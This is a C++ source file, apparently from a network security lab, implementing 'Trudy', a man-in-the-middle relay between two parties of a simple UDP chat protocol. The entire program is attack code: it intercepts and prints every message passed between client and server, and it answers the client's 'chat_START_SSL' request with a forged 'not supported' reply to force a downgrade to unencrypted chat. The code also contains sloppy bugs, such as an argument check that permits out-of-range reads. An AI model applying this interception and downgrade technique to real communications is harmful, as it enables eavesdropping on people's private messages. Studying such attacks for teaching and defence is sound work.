#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h> // read(), write(), close()

// C++ Libraries
#include <iostream>
#include <bits/stdc++.h>
#include <string>
#include <arpa/inet.h>

// OpenSSL libraries
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>

#define MAX 1024
#define DEFAULT_PORT 8080
#define SA struct sockaddr

using namespace std;

// Variables

char buff[MAX];

void fillBuffer(char *buff, string s)
{
    bzero(buff, sizeof(buff));
    int i = 0, msgLen = s.length();

    for (int x = 0; x < msgLen; x++)
        buff[i++] = s[x];
    buff[msgLen] = '\0';
}

void trudy(const char *client, const char *server)
{
    // Client socket will talk to client(Alice)
    // Server socket will talk to Server(Bob)
    cout << "\nTrudy is will listen to all your chat...\n\n";
    int client_sock, server_sock;
    socklen_t client_len, server_len;
    char buffer[MAX];
    struct sockaddr_in client_addr, server_addr;

    // Create UDP socket for Alice
    if ((client_sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        printf("ERROR opening socket for Alice");

    // Create UDP socket for server
    if ((server_sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        printf("ERROR opening socket for server");

    cout << "Sockets are created successfully!!!\n";

    // Initialize Alice address
    memset((char *)&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    client_addr.sin_port = htons(DEFAULT_PORT);

    // Initiai=lize server address
    memset((char *)&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DEFAULT_PORT);

    struct hostent *host_info = gethostbyname(server);
    bcopy((char *)host_info->h_addr, (char *)&server_addr.sin_addr.s_addr, host_info->h_length);

    // Bind the Alice socket
    if (bind(client_sock, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0)
        printf("ERROR on binding CLIENT socket\n");

    cout << "\nIntercepting " << client << " and " << server << "...\n\n";

    while (1)
    {

        client_len = sizeof(client_addr);
        memset(buffer, 0, MAX);

        int n = recvfrom(client_sock, (char *)buffer, MAX, MSG_WAITALL, (struct sockaddr *)&client_addr, &client_len);
        if (n < 0)
        {
            printf("ERROR in receiving from from Alice");
        }
        buffer[n] = '\0';

        cout << "Messge received from client and forwaring to server: " << buffer << endl;

        if (strcmp(buffer, "chat_START_SSL") == 0)
        {
            fillBuffer(buffer, "chat_START_SSL_NOT_SUPPORTED");
            client_len = sizeof(client_addr);
            cout << "Sending Downgrade Message to Client...\n\n";

            if (sendto(client_sock, buffer, strlen(buffer), 0, (struct sockaddr *)&client_addr, client_len) < 0)
                printf("ERROR in sendinf to to Alice");
            continue;
        }

        server_len = sizeof(server_addr);
        if (sendto(server_sock, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr, server_len) < 0)
            printf("ERROR in sending to server");

        if (strcmp(buffer, "chat_close") == 0)
        {
            cout << "Client is closing connection...\n";
            break;
        }

        // Receive response from server
        memset(buffer, 0, MAX);
        n = recvfrom(server_sock, buffer, MAX, 0, (struct sockaddr *)&server_addr, &server_len);
        if (n < 0)
        {
            printf("ERROR in receiving from server");
        }
        buffer[n] = '\0';
        cout << "Messge received from server and forwarding to client: " << buffer << endl;

        // Forward response from server to Alice
        client_len = sizeof(client_addr);
        if (sendto(client_sock, buffer, strlen(buffer), 0, (struct sockaddr *)&client_addr, client_len) < 0)
            printf("ERROR in sending to client");

        if (strcmp(buffer, "chat_close") == 0)
        {
            cout << "Server is closing connection...\n";
            break;
        }
        cout << "\n\n";
    }
    // Close sockets
    close(client_sock);
    close(server_sock);

    return;
}
int main(int argc, char **argv)
{
    if (argc < 2)
    {
        printf("Enter at least 2 arguments.\n");
        return 1;
    }

    else if ((strcmp(argv[1], "-d")))
    {
        printf("Invalid option.\n");
        return 1;
    }
    else
    {
        cout << "\nxxxxxx Someone is listning your chit-chat xxxxxx\n\n";
        trudy(argv[2], argv[3]);
    }

    return 0;
}

